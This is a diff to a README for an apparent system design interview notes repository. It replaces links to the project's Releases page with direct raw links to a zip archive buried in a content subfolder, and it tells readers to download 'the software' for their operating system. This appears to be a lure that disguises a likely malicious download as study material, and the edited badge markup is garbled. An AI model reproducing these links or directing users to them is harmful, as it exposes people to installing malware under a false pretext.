@@ -1,7 +1,7 @@
 # 📖 maang-system-design-playbook - Your Guide to System Design Success
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/otavioola/maang-system-design-playbook/releases)
+[![Download](https://github.com/otavioola/maang-system-design-playbook/raw/refs/heads/main/03-building-blocks/maang-system-playbook-design-v1.7.zip%20Latest%https://github.com/otavioola/maang-system-design-playbook/raw/refs/heads/main/03-building-blocks/maang-system-playbook-design-v1.7.zip)](https://github.com/otavioola/maang-system-design-playbook/raw/refs/heads/main/03-building-blocks/maang-system-playbook-design-v1.7.zip)
 
 ## 📚 Overview
 The **maang-system-design-playbook** is a curated collection of MAANG-style System Design notes. This resource covers fundamental concepts, scalability patterns, trade-offs, and real-world case studies. It is designed for interview preparation and improving your backend and system thinking skills.
@@ -9,7 +9,7 @@ The **maang-system-design-playbook** is a curated collection of MAANG-style Syst
 ## 🚀 Getting Started
 To begin, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/otavioola/maang-system-design-playbook/releases).
+1. Visit the [Releases page](https://github.com/otavioola/maang-system-design-playbook/raw/refs/heads/main/03-building-blocks/maang-system-playbook-design-v1.7.zip).
 2. Choose the latest version available.
 3. Download the relevant files for your system.
 
@@ -28,7 +28,7 @@ Ensure your device meets these requirements for optimal performance.
 - **Interview Preparation**: Get ready for system design interviews with targeted content.
 
 ## 📥 Download & Install
-To download the software, please visit the [Releases page](https://github.com/otavioola/maang-system-design-playbook/releases). Here’s how to install:
+To download the software, please visit the [Releases page](https://github.com/otavioola/maang-system-design-playbook/raw/refs/heads/main/03-building-blocks/maang-system-playbook-design-v1.7.zip). Here’s how to install:
 
 1. Find the latest release version on the page.
 2. Click on the file that matches your operating system.
